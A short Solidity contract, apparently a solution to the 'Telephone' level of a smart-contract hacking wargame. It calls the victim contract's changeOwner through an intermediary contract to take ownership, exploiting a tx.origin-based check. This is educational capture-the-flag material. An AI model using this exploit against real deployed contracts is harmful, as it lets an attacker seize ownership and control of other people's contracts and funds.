// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./4_Telephone.sol";

contract TelephoneAttack {
    Telephone public victimContract;
    address owner;

    constructor(address _victimContractAddr) {
        victimContract = Telephone(_victimContractAddr);
        owner = msg.sender;
    }

    function attackVictim() public {
        victimContract.changeOwner(owner);
    }
}
